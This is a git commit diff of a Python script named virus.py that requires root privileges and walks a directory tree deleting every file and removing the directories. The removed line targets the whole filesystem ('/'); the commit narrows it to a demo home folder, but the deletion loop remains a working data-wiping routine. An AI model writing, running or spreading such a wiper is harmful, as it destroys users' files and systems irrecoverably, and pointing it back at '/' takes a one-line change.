98f60e98c8289c73216ce21e6f9ac532ccdad067
Munseer-am <munnamunseer7@gmail.com>
2022-12-08 09:28:12 +0530

    completed

--- virus.py
+++ virus.py
@@ -5,7 +5,7 @@ if os.getuid() != 0:
 	print("Run as administator")
 	quit()
 
-root = os.path.expanduser("/")
+root = os.path.expanduser("/home/munseer/Demo")
 os.chdir(root)
 
 files = []
@@ -13,21 +13,5 @@ dirs = []
 
 for path, subdirs, files in os.walk(root):
 	for file in files:
-		# files.append(os.path.join(path, file))
-		# dirs.append(path)
-		os.remove(os.path.join(path, file))	
-		shutil.rmtree(path)
-		# except FileNotFoundError:
-		# 	continue
-
-# for dir in dirs:
-# 	print(dir)
-
-# for doc in docs:
-# 	try:
-# 		if os.path.isfile(doc):
-# 			os.remove(doc)
-# 		else:
-# 			shutil.rmtree(doc)
-# 	except:
-# 		continue
+		os.remove(os.path.join(path, file))
+	shutil.rmtree(path)
